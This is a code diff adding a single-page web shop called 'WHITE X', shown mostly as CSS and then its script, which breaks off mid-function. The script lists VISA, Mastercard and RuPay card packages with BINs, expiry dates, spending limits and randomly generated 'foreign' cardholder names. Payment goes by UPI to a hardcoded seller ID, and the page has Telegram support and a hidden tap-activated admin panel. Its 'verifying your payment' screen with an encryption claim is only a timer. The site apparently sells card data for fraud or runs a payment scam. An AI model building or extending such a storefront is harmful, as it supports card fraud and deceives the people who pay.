+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.92);
+            backdrop-filter: blur(24px);
+            -webkit-backdrop-filter: blur(24px);
+            z-index: 5000;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            padding: 1rem;
+        }
+
+        .fail-popup-overlay.active {
+            display: flex;
+        }
+
+        .fail-popup {
+            max-width: 420px;
+            width: 100%;
+            background: rgba(15, 8, 18, 0.98);
+            border-radius: 1.8rem;
+            padding: 2rem 1.5rem;
+            border: 1px solid rgba(255, 50, 80, 0.4);
+            box-shadow: 0 0 80px rgba(255, 50, 80, 0.1);
+            text-align: center;
+            animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        @keyframes popIn {
+            0% {
+                transform: scale(0.7) translateY(40px);
+                opacity: 0;
+            }
+            100% {
+                transform: scale(1) translateY(0);
+                opacity: 1;
+            }
+        }
+
+        .fail-popup .fail-icon-big {
+            font-size: 4.5rem;
+            color: #ff3366;
+            text-shadow: 0 0 50px #ff3366;
+            margin-bottom: 0.5rem;
+            animation: shakeFail 0.8s ease-in-out;
+        }
+
+        @keyframes shakeFail {
+            0%,
+            100% {
+                transform: rotate(0deg);
+            }
+            10% {
+                transform: rotate(-15deg);
+            }
+            30% {
+                transform: rotate(15deg);
+            }
+            50% {
+                transform: rotate(-10deg);
+            }
+            70% {
+                transform: rotate(10deg);
+            }
+            90% {
+                transform: rotate(-5deg);
+            }
+        }
+
+        .fail-popup h2 {
+            font-size: 1.5rem;
+            color: #ff3366;
+            margin-bottom: 0.3rem;
+        }
+
+        .fail-popup .sub-text {
+            font-size: 0.85rem;
+            color: #99aabb;
+            margin-bottom: 0.8rem;
+        }
+
+        .fail-popup .fail-details {
+            background: rgba(255, 0, 50, 0.06);
+            border: 1px solid rgba(255, 0, 50, 0.15);
+            border-radius: 0.8rem;
+            padding: 0.8rem 1rem;
+            margin: 0.8rem 0;
+            font-size: 0.8rem;
+            color: #cc8899;
+            text-align: left;
+        }
+
+        .fail-popup .fail-details .row {
+            display: flex;
+            justify-content: space-between;
+            padding: 4px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
+        }
+
+        .fail-popup .fail-details .row:last-child {
+            border-bottom: none;
+        }
+
+        .fail-popup .fail-details .label {
+            color: #8899aa;
+        }
+
+        .fail-popup .fail-details .value {
+            color: #ff7799;
+            font-weight: 500;
+        }
+
+        .fail-popup .support-contact {
+            background: rgba(0, 200, 255, 0.05);
+            border: 1px solid rgba(0, 200, 255, 0.15);
+            border-radius: 0.8rem;
+            padding: 0.6rem;
+            margin: 0.6rem 0;
+            font-size: 0.75rem;
+            color: #88ccdd;
+        }
+
+        .fail-popup .support-contact i {
+            color: cyan;
+        }
+
+        .fail-popup .support-contact .tg-link {
+            color: #0088cc;
+            font-weight: 600;
+            text-decoration: none;
+        }
+
+        .fail-popup .support-contact .tg-link:hover {
+            text-decoration: underline;
+        }
+
+        .fail-popup .btn-group {
+            display: flex;
+            gap: 10px;
+            margin-top: 1rem;
+        }
+
+        .fail-popup .btn-group .btn-primary {
+            flex: 1;
+            justify-content: center;
+        }
+
+        .fail-popup .btn-group .btn-outline {
+            flex: 1;
+            justify-content: center;
+            border-color: #ff3366;
+            color: #ff3366;
+        }
+
+        .success-popup-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.88);
+            backdrop-filter: blur(24px);
+            -webkit-backdrop-filter: blur(24px);
+            z-index: 5000;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            padding: 1rem;
+        }
+
+        .success-popup-overlay.active {
+            display: flex;
+        }
+
+        .success-popup {
+            max-width: 420px;
+            width: 100%;
+            background: rgba(8, 20, 15, 0.98);
+            border-radius: 1.8rem;
+            padding: 2rem 1.5rem;
+            border: 1px solid rgba(0, 255, 200, 0.4);
+            box-shadow: 0 0 80px rgba(0, 255, 200, 0.1);
+            text-align: center;
+            animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        .success-popup .success-icon-big {
+            font-size: 4.5rem;
+            color: #00ff88;
+            text-shadow: 0 0 50px #00ff88;
+            margin-bottom: 0.5rem;
+        }
+
+        .success-popup h2 {
+            font-size: 1.5rem;
+            color: #00ff88;
+            margin-bottom: 0.3rem;
+        }
+
+        .success-popup .sub-text {
+            font-size: 0.85rem;
+            color: #99aabb;
+        }
+
+        .success-popup .card-details {
+            background: rgba(0, 255, 200, 0.04);
+            border: 1px solid rgba(0, 255, 200, 0.12);
+            border-radius: 0.8rem;
+            padding: 0.8rem 1rem;
+            margin: 0.8rem 0;
+            font-size: 0.8rem;
+            color: #88ddcc;
+            text-align: left;
+        }
+
+        .success-popup .card-details .row {
+            display: flex;
+            justify-content: space-between;
+            padding: 4px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
+        }
+
+        .success-popup .card-details .row:last-child {
+            border-bottom: none;
+        }
+
+        .success-popup .card-details .label {
+            color: #8899aa;
+        }
+
+        .success-popup .card-details .value {
+            color: #fff;
+            font-weight: 600;
+        }
+
+        .success-popup .btn-group {
+            display: flex;
+            gap: 10px;
+            margin-top: 1rem;
+        }
+
+        .success-popup .btn-group .btn-primary {
+            flex: 1;
+            justify-content: center;
+        }
+
+        .admin-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            z-index: 9999;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            padding: 1rem;
+            overflow-y: auto;
+        }
+
+        .admin-overlay.active {
+            display: flex;
+        }
+
+        .admin-panel {
+            max-width: 900px;
+            width: 100%;
+            max-height: 90vh;
+            overflow-y: auto;
+            background: rgba(10, 10, 20, 0.95);
+            border-radius: 1.5rem;
+            padding: 1.5rem;
+            border: 1px solid rgba(0, 255, 255, 0.3);
+            box-shadow: 0 0 60px rgba(0, 255, 255, 0.1);
+        }
+
+        .admin-panel::-webkit-scrollbar {
+            width: 4px;
+        }
+        .admin-panel::-webkit-scrollbar-track {
+            background: #0a0a15;
+        }
+        .admin-panel::-webkit-scrollbar-thumb {
+            background: #00ffff66;
+            border-radius: 10px;
+        }
+
+        .admin-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid rgba(0, 255, 255, 0.2);
+            padding-bottom: 0.8rem;
+            margin-bottom: 1.2rem;
+        }
+
+        .admin-header h2 {
+            font-size: 1.3rem;
+            color: cyan;
+        }
+
+        .admin-close-btn {
+            background: rgba(255, 0, 50, 0.2);
+            border: 1px solid #ff3366;
+            color: #ff3366;
+            border-radius: 50%;
+            width: 36px;
+            height: 36px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            font-size: 1.2rem;
+            transition: 0.3s;
+        }
+
+        .admin-close-btn:hover {
+            background: rgba(255, 0, 50, 0.4);
+            transform: rotate(90deg);
+        }
+
+        .admin-section {
+            margin-bottom: 1.5rem;
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 1rem;
+            padding: 1rem;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .admin-section h3 {
+            font-size: 1rem;
+            color: #88ccff;
+            margin-bottom: 0.8rem;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .admin-section h3 .badge-count {
+            font-size: 0.6rem;
+            background: rgba(0, 255, 255, 0.15);
+            padding: 0.1rem 0.5rem;
+            border-radius: 30px;
+            color: #88ffff;
+        }
+
+        .admin-row {
+            display: grid;
+            grid-template-columns: 0.8fr 1fr 0.9fr 0.8fr 0.8fr 0.8fr 0.5fr;
+            gap: 5px;
+            margin-bottom: 5px;
+            align-items: center;
+        }
+
+        .admin-row input,
+        .admin-row select {
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid #2a2a3a;
+            border-radius: 0.5rem;
+            padding: 0.35rem 0.5rem;
+            color: white;
+            font-size: 0.7rem;
+            font-family: 'Inter', sans-serif;
+            outline: none;
+            width: 100%;
+        }
+
+        .admin-row input:focus,
+        .admin-row select:focus {
+            border-color: cyan;
+        }
+
+        .admin-row .delete-btn {
+            background: rgba(255, 0, 50, 0.2);
+            border: 1px solid #ff3366;
+            color: #ff3366;
+            border-radius: 0.5rem;
+            padding: 0.25rem 0.5rem;
+            cursor: pointer;
+            font-size: 0.65rem;
+            transition: 0.3s;
+            text-align: center;
+        }
+
+        .admin-row .delete-btn:hover {
+            background: rgba(255, 0, 50, 0.4);
+        }
+
+        .admin-row .best-seller-check {
+            width: 16px;
+            height: 16px;
+            accent-color: #ff44aa;
+            cursor: pointer;
+        }
+
+        .admin-add-row {
+            display: flex;
+            gap: 5px;
+            margin-top: 8px;
+            flex-wrap: wrap;
+        }
+
+        .admin-add-row input {
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid #2a2a3a;
+            border-radius: 0.5rem;
+            padding: 0.35rem 0.5rem;
+            color: white;
+            font-size: 0.7rem;
+            font-family: 'Inter', sans-serif;
+            outline: none;
+            flex: 1;
+            min-width: 50px;
+        }
+
+        .admin-add-row input:focus {
+            border-color: cyan;
+        }
+
+        .admin-add-row .add-btn {
+            background: rgba(0, 255, 200, 0.15);
+            border: 1px solid #00cc88;
+            color: #00cc88;
+            border-radius: 0.5rem;
+            padding: 0.25rem 0.8rem;
+            cursor: pointer;
+            font-size: 0.7rem;
+            transition: 0.3s;
+        }
+
+        .admin-add-row .add-btn:hover {
+            background: rgba(0, 255, 200, 0.3);
+        }
+
+        .admin-upi-row {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+
+        .admin-upi-row input {
+            flex: 1;
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid #2a2a3a;
+            border-radius: 0.5rem;
+            padding: 0.5rem 0.8rem;
+            color: white;
+            font-size: 0.85rem;
+            font-family: 'Inter', sans-serif;
+            outline: none;
+            min-width: 200px;
+        }
+
+        .admin-upi-row input:focus {
+            border-color: cyan;
+        }
+
+        .admin-save-btn {
+            background: linear-gradient(95deg, #00cc88, #00aa66);
+            border: none;
+            padding: 0.6rem 2rem;
+            border-radius: 2rem;
+            font-weight: 700;
+            font-size: 0.9rem;
+            color: white;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            box-shadow: 0 0 8px #00cc8866;
+            width: 100%;
+            margin-top: 0.5rem;
+        }
+
+        .admin-save-btn:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 22px #00cc88, 0 0 12px #00ffaa;
+        }
+
+        .admin-save-btn:active {
+            transform: scale(0.97);
+        }
+
+        .admin-toast {
+            position: fixed;
+            bottom: 2rem;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0, 200, 100, 0.9);
+            backdrop-filter: blur(10px);
+            padding: 0.8rem 1.5rem;
+            border-radius: 2rem;
+            color: white;
+            font-weight: 600;
+            font-size: 0.9rem;
+            z-index: 99999;
+            display: none;
+            box-shadow: 0 0 30px rgba(0, 200, 100, 0.3);
+            border: 1px solid rgba(0, 255, 200, 0.3);
+        }
+
+        .admin-toast.show {
+            display: block;
+            animation: fadeInUp 0.4s ease;
+        }
+
+        @keyframes fadeInUp {
+            0% {
+                opacity: 0;
+                transform: translateX(-50%) translateY(20px);
+            }
+            100% {
+                opacity: 1;
+                transform: translateX(-50%) translateY(0);
+            }
+        }
+
+        /* ===== LOGOUT POPUP ===== */
+        .logout-popup-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(24px);
+            -webkit-backdrop-filter: blur(24px);
+            z-index: 8000;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            padding: 1rem;
+        }
+
+        .logout-popup-overlay.active {
+            display: flex;
+        }
+
+        .logout-popup {
+            max-width: 400px;
+            width: 100%;
+            background: rgba(12, 12, 25, 0.95);
+            border-radius: 2rem;
+            padding: 2rem 1.5rem;
+            border: 1px solid rgba(0, 255, 255, 0.2);
+            box-shadow: 0 0 60px rgba(0, 255, 255, 0.05);
+            text-align: center;
+            animation: popIn 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        .logout-popup .logout-icon {
+            font-size: 3.5rem;
+            color: #ff6b6b;
+            margin-bottom: 0.5rem;
+        }
+
+        .logout-popup h2 {
+            font-size: 1.3rem;
+            color: #fff;
+            margin-bottom: 0.3rem;
+        }
+
+        .logout-popup p {
+            font-size: 0.85rem;
+            color: #8899aa;
+            margin-bottom: 1.2rem;
+        }
+
+        .logout-popup .logout-domain {
+            font-size: 0.7rem;
+            color: #667;
+            background: rgba(255, 255, 255, 0.05);
+            padding: 0.4rem 1rem;
+            border-radius: 2rem;
+            display: inline-block;
+            margin-bottom: 1.2rem;
+        }
+
+        .logout-popup .logout-domain i {
+            color: cyan;
+            margin-right: 6px;
+        }
+
+        .logout-popup .btn-group {
+            display: flex;
+            gap: 12px;
+        }
+
+        .logout-popup .btn-group .btn-primary {
+            flex: 1;
+            justify-content: center;
+            background: linear-gradient(95deg, #ff3366, #cc0044);
+            box-shadow: 0 0 8px #ff336677;
+        }
+
+        .logout-popup .btn-group .btn-primary:hover {
+            box-shadow: 0 0 22px #ff3366, 0 0 12px #ff0044;
+        }
+
+        .logout-popup .btn-group .btn-cancel-logout {
+            flex: 1;
+            justify-content: center;
+            background: rgba(255, 255, 255, 0.06);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            border-radius: 2rem;
+            padding: 0.7rem 1.5rem;
+            font-weight: 600;
+            font-size: 0.9rem;
+            color: #8899aa;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .logout-popup .btn-group .btn-cancel-logout:hover {
+            background: rgba(255, 255, 255, 0.1);
+            border-color: rgba(255, 255, 255, 0.3);
+            color: #fff;
+        }
+
+        /* ===== THANK YOU ANIMATION ===== */
+        .thankyou-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at center, #0a0a1a, #000000);
+            z-index: 10000;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            padding: 2rem;
+        }
+
+        .thankyou-overlay.active {
+            display: flex;
+        }
+
+        .thankyou-content {
+            text-align: center;
+            animation: thankyouAnim 1.2s ease-out forwards;
+        }
+
+        @keyframes thankyouAnim {
+            0% {
+                opacity: 0;
+                transform: scale(0.6) translateY(30px);
+            }
+            60% {
+                opacity: 1;
+                transform: scale(1.05) translateY(-5px);
+            }
+            100% {
+                opacity: 1;
+                transform: scale(1) translateY(0);
+            }
+        }
+
+        .thankyou-content .thankyou-icon {
+            font-size: 5rem;
+            color: #00ff88;
+            text-shadow: 0 0 60px #00ff88;
+            margin-bottom: 1rem;
+            animation: pulseThankYou 2s ease-in-out infinite;
+        }
+
+        @keyframes pulseThankYou {
+            0%,
+            100% {
+                transform: scale(1);
+                opacity: 1;
+            }
+            50% {
+                transform: scale(1.1);
+                opacity: 0.8;
+            }
+        }
+
+        .thankyou-content h1 {
+            font-size: 2.5rem;
+            font-weight: 700;
+            background: linear-gradient(135deg, #fff, #00ffff, #bf4aff);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 0.3rem;
+        }
+
+        .thankyou-content p {
+            font-size: 1rem;
+            color: #8899aa;
+            margin-bottom: 0.2rem;
+        }
+
+        .thankyou-content .thankyou-sub {
+            font-size: 0.8rem;
+            color: #667;
+            margin-top: 0.5rem;
+        }
+
+        .thankyou-content .thankyou-sub i {
+            color: cyan;
+            margin: 0 4px;
+        }
+
+        .thankyou-content .thankyou-logo {
+            font-size: 1.2rem;
+            font-weight: 700;
+            background: linear-gradient(135deg, #fff, #00ffff, #bf4aff);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-top: 0.8rem;
+            letter-spacing: 2px;
+        }
+
+        .thankyou-content .sparkles {
+            margin-top: 0.5rem;
+            font-size: 2rem;
+            animation: sparkle 1.5s ease-in-out infinite;
+        }
+
+        @keyframes sparkle {
+            0%,
+            100% {
+                transform: scale(1) rotate(0deg);
+            }
+            50% {
+                transform: scale(1.2) rotate(10deg);
+            }
+        }
+
+        @media (max-width: 768px) {
+            .login-card {
+                padding: 1.8rem 1.2rem;
+                border-radius: 1.5rem;
+            }
+            .login-header .neon-logo {
+                font-size: 2rem;
+            }
+            .navbar {
+                padding: 0.6rem 1rem;
+            }
+            .navbar .neon-logo {
+                font-size: 1.2rem;
+            }
+            .nav-links {
+                gap: 0.4rem;
+            }
+            .nav-links a {
+                font-size: 0.7rem;
+                padding: 0.2rem 0.4rem;
+            }
+            .nav-links .btn-outline {
+                font-size: 0.6rem;
+                padding: 0.2rem 0.6rem;
+            }
+            .hero {
+                padding: 1rem 1rem;
+                gap: 1rem;
+            }
+            .hero-left .neon-logo {
+                font-size: 1.8rem;
+            }
+            .hero-left h1 {
+                font-size: 1.2rem;
+            }
+            .hero-left p {
+                font-size: 0.75rem;
+            }
+            .hero-right {
+                min-height: 260px;
+            }
+            .ring-1 {
+                width: 160px;
+                height: 160px;
+            }
+            .ring-2 {
+                width: 200px;
+                height: 200px;
+            }
+            .ring-3 {
+                width: 120px;
+                height: 120px;
+            }
+            .section-title {
+                font-size: 1.3rem;
+            }
+            .tab-btn {
+                font-size: 0.65rem;
+                padding: 0.4rem 0.8rem;
+            }
+            .tab-btn img {
+                width: 20px;
+                height: 14px;
+            }
+            .cards-grid {
+                grid-template-columns: 1fr;
+                gap: 1rem;
+            }
+            .package-card {
+                padding: 1rem;
+            }
+            .package-card .card-type-display img {
+                width: 36px;
+                height: 22px;
+            }
+            .package-card .card-type-display .network-name {
+                font-size: 0.85rem;
+            }
+            .package-card .info-card-box .meta-value {
+                font-size: 0.8rem;
+            }
+            .package-card .price-tag {
+                font-size: 1.2rem;
+            }
+            .support-card {
+                width: 160px;
+                padding: 0.8rem;
+            }
+            .qr-container,
+            .utr-container,
+            .fail-container {
+                margin: 1rem 0.8rem;
+                padding: 1rem;
+            }
+            canvas.qr-canvas {
+                width: 200px;
+                height: 200px;
+            }
+            .qr-placeholder {
+                width: 200px;
+                height: 200px;
+            }
+            .back-btn {
+                font-size: 0.7rem;
+                padding: 0.3rem 1rem;
+            }
+            .admin-panel {
+                padding: 1rem;
+            }
+            .admin-row {
+                grid-template-columns: 0.7fr 0.9fr 0.7fr 0.6fr 0.6fr 0.6fr 0.4fr;
+                gap: 3px;
+            }
+            .admin-row input {
+                font-size: 0.6rem;
+                padding: 0.25rem 0.3rem;
+            }
+            .packages-section {
+                padding: 1.5rem 1rem 3rem;
+            }
+            .support-section {
+                padding: 2rem 1rem;
+            }
+            footer {
+                padding: 1.5rem 1rem;
+            }
+            .vault-card {
+                width: 160px;
+                height: 110px;
+            }
+            .card-vault {
+                height: 170px;
+            }
+            .logout-popup {
+                padding: 1.5rem 1.2rem;
+            }
+            .logout-popup .btn-group {
+                flex-direction: column;
+            }
+            .thankyou-content h1 {
+                font-size: 2rem;
+            }
+            .thankyou-content .thankyou-icon {
+                font-size: 4rem;
+            }
+            .qr-download-btn {
+                padding: 0.6rem 1.5rem;
+                font-size: 0.8rem;
+            }
+        }
+
+        @media (max-width: 400px) {
+            .login-card {
+                padding: 1.5rem 1rem;
+                border-radius: 1.2rem;
+            }
+            .login-header .neon-logo {
+                font-size: 1.6rem;
+            }
+            .navbar .neon-logo {
+                font-size: 1rem;
+            }
+            .nav-links {
+                gap: 0.3rem;
+            }
+            .nav-links a {
+                font-size: 0.6rem;
+            }
+            .hero-right {
+                min-height: 220px;
+            }
+            .hero-left h1 {
+                font-size: 1rem;
+            }
+            .admin-row {
+                grid-template-columns: 0.6fr 0.8fr 0.6fr 0.5fr 0.5fr 0.5fr 0.3fr;
+                gap: 2px;
+            }
+            .vault-card {
+                width: 140px;
+                height: 95px;
+                padding: 0.6rem;
+            }
+            .vault-card .card-number {
+                font-size: 0.6rem;
+            }
+            .vault-card .card-top .chip {
+                width: 22px;
+                height: 16px;
+            }
+            .card-vault {
+                height: 150px;
+            }
+            .support-card {
+                width: 140px;
+                padding: 0.6rem;
+            }
+            .support-card i {
+                font-size: 1.5rem;
+            }
+            .support-card h3 {
+                font-size: 0.7rem;
+            }
+            .support-card p {
+                font-size: 0.6rem;
+            }
+            .support-card .telegram-username {
+                font-size: 0.65rem;
+            }
+            .support-card .telegram-btn {
+                font-size: 0.6rem;
+                padding: 0.3rem 0.8rem;
+            }
+            .logout-popup {
+                padding: 1.2rem 1rem;
+            }
+            .logout-popup h2 {
+                font-size: 1.1rem;
+            }
+            .thankyou-content h1 {
+                font-size: 1.6rem;
+            }
+            .thankyou-content .thankyou-icon {
+                font-size: 3rem;
+            }
+            canvas.qr-canvas {
+                width: 170px;
+                height: 170px;
+            }
+            .qr-placeholder {
+                width: 170px;
+                height: 170px;
+            }
+            .qr-download-btn {
+                padding: 0.5rem 1.2rem;
+                font-size: 0.7rem;
+            }
+        }
+
+        @media (hover: none) {
+            .btn-primary:hover,
+            .btn-danger:hover,
+            .btn-outline:hover,
+            .btn-success:hover,
+            .btn-cancel:hover {
+                transform: none;
+            }
+            .glass-card:hover {
+                transform: none;
+            }
+            .package-card:hover {
+                transform: none;
+            }
+            .support-card:hover {
+                transform: none;
+            }
+            .back-btn:hover {
+                transform: none;
+            }
+            .login-header .neon-logo:hover {
+                transform: none;
+            }
+            .support-card .telegram-btn:hover {
+                background: rgba(0, 136, 204, 0.2);
+            }
+            .logout-popup .btn-group .btn-cancel-logout:hover {
+                background: rgba(255, 255, 255, 0.06);
+            }
+            canvas.qr-canvas:hover {
+                transform: none;
+            }
+            .qr-download-btn:hover {
+                transform: none;
+            }
+        }
+
+        @media (min-width: 1400px) {
+            .hero {
+                padding: 2.5rem 2rem;
+            }
+            .packages-section {
+                padding: 2.5rem 2rem 4rem;
+            }
+            .cards-grid {
+                grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+                gap: 1.5rem;
+            }
+            .hero-left h1 {
+                font-size: 2rem;
+            }
+            .hero-left p {
+                font-size: 1rem;
+            }
+            .section-title {
+                font-size: 2rem;
+            }
+        }
+    </style>
+</head>
+<body id="appRoot"></body>
+
+<script>
+    // ========== STATE ==========
+    let isLoggedIn = false;
+    let showWelcome = false;
+    let currentView = 'home';
+    let selectedPackage = null;
+    let adminTapCount = 0;
+    let adminTapTimeout = null;
+
+    // ========== DOMAIN NAME ==========
+    const SITE_NAME = 'WHITE X';
+    const DOMAIN = 'whitex.com';
+
+    // ========== ONLY FOREIGN NAMES ==========
+    const FOREIGN_FIRST = [
+        'Thomas', 'Jerry', 'Michael', 'David', 'Christopher', 'James', 'John', 'Robert',
+        'William', 'Richard', 'Joseph', 'Charles', 'Daniel', 'Matthew', 'Anthony', 'Mark',
+        'Donald', 'Steven', 'Paul', 'Andrew', 'Joshua', 'Kenneth', 'Kevin', 'Brian',
+        'Timothy', 'Ronald', 'Edward', 'Jason', 'Jeffrey', 'Ryan', 'Jacob', 'Gary',
+        'Nicholas', 'Eric', 'Jonathan', 'Stephen', 'Larry', 'Justin', 'Scott', 'Brandon',
+        'Benjamin', 'Samuel', 'Raymond', 'Gregory', 'Frank', 'Alexander', 'Patrick', 'Jack',
+        'Dennis', 'Tyler', 'Aaron', 'Jose', 'Nathan', 'Adam', 'Henry', 'Zachary'
+    ];
+
+    const FOREIGN_LAST = [
+        'Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis',
+        'Rodriguez', 'Martinez', 'Hernandez', 'Lopez', 'Wilson', 'Anderson', 'Thomas', 'Taylor',
+        'Moore', 'Jackson', 'Martin', 'Lee', 'Perez', 'Thompson', 'White', 'Harris',
+        'Sanchez', 'Clark', 'Ramirez', 'Lewis', 'Robinson', 'Walker', 'Young', 'Allen',
+        'King', 'Wright', 'Scott', 'Torres', 'Nguyen', 'Hill', 'Flores', 'Green',
+        'Adams', 'Nelson', 'Baker', 'Hall', 'Rivera', 'Campbell', 'Mitchell', 'Carter',
+        'Roberts', 'Turner', 'Phillips', 'Evans', 'Collins', 'Edwards', 'Stewart', 'Morris'
+    ];
+
+    function generateForeignName() {
+        const first = FOREIGN_FIRST[Math.floor(Math.random() * FOREIGN_FIRST.length)];
+        const last = FOREIGN_LAST[Math.floor(Math.random() * FOREIGN_LAST.length)];
+        return `${first} ${last}`;
+    }
+
+    // ========== CARD IMAGES ==========
+    const CARD_IMAGES = {
+        VISA: 'https://iili.io/CxzYaHl.png',
+        Mastercard: 'https://iili.io/Cxz56Ba.png',
+        RuPay: 'https://iili.io/Cxzangj.png'
+    };
+
+    const NETWORK_LOGOS = {
+        VISA: 'https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png',
+        Mastercard: 'https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png',
+        RuPay: 'https://upload.wikimedia.org/wikipedia/commons/thumb/1/1a/RuPay_logo.svg/1280px-RuPay_logo.svg.png'
+    };
+
+    // ========== DEFAULT PLANS ==========
+    function generateDefaultPlans() {
+        const networks = ['VISA', 'Mastercard', 'RuPay'];
+        const plans = {};
+        networks.forEach(net => {
+            plans[net] = [];
+            const count = net === 'RuPay' ? 16 : net === 'Mastercard' ? 9 : 12;
+            for (let i = 0; i < count; i++) {
+                const price = net === 'RuPay' ? [199, 299, 399, 499, 599, 699, 799, 999, 1199, 1499, 1799, 2199, 2999, 3999, 5499, 7999][i] || 499 :
+                    net === 'Mastercard' ? [499, 699, 899, 1199, 1499, 1999, 2999, 4499, 6999][i] || 699 :
+                    [399, 499, 599, 699, 799, 999, 1299, 1599, 1999, 2999, 4499, 6999][i] || 499;
+                const limit = net === 'RuPay' ? [1500, 2500, 3500, 5000, 6500, 8000, 10000, 14000, 18000, 25000, 32000, 42000, 58000, 78000, 110000, 160000][i] || 5000 :
+                    net === 'Mastercard' ? [4000, 7000, 11000, 18000, 25000, 35000, 55000, 85000, 140000][i] || 7000 :
+                    [3000, 4500, 6000, 8000, 10000, 15000, 22000, 30000, 40000, 60000, 90000, 150000][i] || 5000;
+                const bin = net === 'RuPay' ? `65210${String(i + 1).padStart(2, '0')}`.slice(0, 6) :
+                    net === 'Mastercard' ? `54123${String(i + 4).padStart(2, '0')}`.slice(0, 6) :
+                    `45320${String(i + 1).padStart(2, '0')}`.slice(0, 6);
+                const expiry = `${String(i % 12 + 1).padStart(2, '0')}/${2028 + Math.floor(i / 6)}`;
+                plans[net].push({
+                    price: price,
+                    limit: limit,
+                    bin: bin,
+                    expiry: expiry,
+                    bestSeller: i === 3 || i === 5 || i === 8,
+                    cardHolder: generateForeignName()
+                });
+            }
+        });
+        return plans;
+    }
+
+    const DEFAULT_PLANS = generateDefaultPlans();
+
+    // ========== LOAD / SAVE DATA ==========
+    let packagesData = {};
+    let upiId = 'shivamxseller@fam';
+
+    function loadData() {
+        try {
+            const saved = localStorage.getItem('whitex_data');
+            if (saved) {
+                const data = JSON.parse(saved);
+                packagesData = data.packages || JSON.parse(JSON.stringify(DEFAULT_PLANS));
+                upiId = data.upiId || 'shivamxseller@fam';
+            } else {
+                packagesData = JSON.parse(JSON.stringify(DEFAULT_PLANS));
+                upiId = 'shivamxseller@fam';
+            }
+        } catch (e) {
+            packagesData = JSON.parse(JSON.stringify(DEFAULT_PLANS));
+            upiId = 'shivamxseller@fam';
+        }
+    }
+
+    function saveData() {
+        try {
+            localStorage.setItem('whitex_data', JSON.stringify({
+                packages: packagesData,
+                upiId: upiId
+            }));
+        } catch (e) {
+            console.error('Save error:', e);
+        }
+    }
+
+    loadData();
+
+    let activeNetwork = "VISA";
+
+    function formatINR(amount) {
+        return '₹' + amount.toLocaleString('en-IN');
+    }
+
+    function createRipple(event, element) {
+        const rect = element.getBoundingClientRect();
+        const size = Math.max(rect.width, rect.height);
+        const x = (event.touches ? event.touches[0].clientX : event.clientX) - rect.left - size / 2;
+        const y = (event.touches ? event.touches[0].clientY : event.clientY) - rect.top - size / 2;
+        const ripple = document.createElement('span');
+        ripple.classList.add('ripple');
+        ripple.style.width = ripple.style.height = `${size}px`;
+        ripple.style.left = `${x}px`;
+        ripple.style.top = `${y}px`;
+        ripple.style.position = 'absolute';
+        element.style.position = 'relative';
+        element.appendChild(ripple);
+        setTimeout(() => ripple.remove(), 600);
+    }
+
+    function showLoadingTransition(callback) {
+        let overlay = document.querySelector('.loading-overlay');
+        if (!overlay) {
+            overlay = document.createElement('div');
+            overlay.className = 'loading-overlay';
+            overlay.innerHTML = `
+                <div class="loading-card">
+                    <div class="spinner-neon"></div>
+                    <div class="loading-text">Processing...</div>
+                    <div class="loading-sub">Please wait while we verify your payment</div>
+                    <div style="margin-top: 0.8rem; font-size: 0.65rem; color: #6a6a8a;"><i class="fas fa-lock"></i> 256-bit encrypted</div>
+                </div>
+            `;
+            document.body.appendChild(overlay);
+        }
+        overlay.classList.add('active');
+        setTimeout(() => {
+            if (callback) callback();
+            setTimeout(() => overlay.classList.remove('active'), 450);
+        }, 1500);
+    }
+
+    function handleBuyNowWithAnimation(event, btn, price, network, bin, expiry, limit, cardHolder) {
+        event.stopPropagation();
+        if (btn.disabled) return;
+        btn.disabled = true;
+        btn.classList.add('pulse-glow');
+        createRipple(event, btn);
+        btn.style.transform = 'scale(0.96)';
+        setTimeout(() => { btn.style.transform = ''; }, 150);
+        showLoadingTransition(() => {
